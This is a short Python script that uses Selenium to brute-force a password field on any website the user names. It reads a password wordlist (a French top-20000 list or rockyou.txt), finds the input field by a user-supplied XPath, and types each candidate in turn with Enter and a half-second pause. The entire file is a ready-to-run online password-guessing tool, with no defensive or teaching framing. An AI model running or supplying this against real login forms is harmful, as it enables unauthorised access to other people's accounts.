import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager

# Ask the user for wordlist choice
wordlist_choice = input("Enter 1 for french_passwords_top20000.txt or 2 for rockyou.txt: ")

if wordlist_choice == '1':
    wordlist_path = "tools/bruteforce/passwords/french_passwords_top20000.txt"
elif wordlist_choice == '2':
    wordlist_path = "tools/bruteforce/passwords/rockyou.txt"
else:
    print("Invalid choice. Exiting.")
    exit()

# Read the selected wordlist
with open(wordlist_path, "r") as f:
    mdps = f.read().split("\n")

timeSleep = 0.5

website = input("Enter the target website: ")

service = Service(ChromeDriverManager().install())
driver = webdriver.Chrome(service=service)
driver.get(website)

xpath = input("Enter the XPath: ")

input_xpath_messageBox = xpath
input_messageBox = driver.find_element(by=By.XPATH, value=input_xpath_messageBox)
time.sleep(timeSleep)

print("The process can now begin.")

for word in mdps:
    for letter in word:
        input_messageBox.send_keys(letter)
    input_messageBox.send_keys(Keys.ENTER)
    for i in range(len(word)):
        input_messageBox.send_keys(Keys.BACKSPACE)
    time.sleep(timeSleep)

print("Password not found.")
